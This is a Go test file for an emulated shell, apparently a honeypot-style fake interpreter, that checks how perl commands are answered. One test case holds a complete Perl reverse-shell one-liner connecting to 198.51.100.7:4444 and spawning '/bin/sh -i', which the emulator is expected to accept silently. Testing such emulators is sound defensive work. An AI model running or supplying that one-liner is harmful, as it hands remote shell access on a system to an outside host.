package shell

import (
	"strings"
	"testing"
)

func TestPerl(t *testing.T) {
	cases := []struct {
		line, want string
		code       int
	}{
		{"perl -e 'print \"hello\\n\"'", "hello", 0},
		{"perl -e 'print 42'", "42", 0},
		{`perl -e 'use Socket;$i="198.51.100.7";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){exec("/bin/sh -i");};'`, "", 0},
		{"perl /tmp/none.pl", `Can't open perl script "/tmp/none.pl": No such file or directory`, 2},
		{"perl -e", "No code specified for -e.", 25},
	}
	for _, tc := range cases {
		s := NewInterpreter("root")
		if out, code := run(t, s, tc.line); out != tc.want || code != tc.code {
			t.Errorf("%q = %q %d, want %q %d", tc.line, out, code, tc.want, tc.code)
		}
	}
	s := NewInterpreter("root")
	if out, code := run(t, s, "perl -v"); !strings.Contains(out, "This is perl 5, version 34, subversion 0 (v5.34.0) built for x86_64-linux-gnu-thread-multi") || code != 0 {
		t.Errorf("perl -v = %q %d", out, code)
	}
	run(t, s, "touch /tmp/a.pl")
	if out, code := run(t, s, "perl /tmp/a.pl"); out != "" || code != 0 {
		t.Errorf("existing script = %q %d", out, code)
	}
}
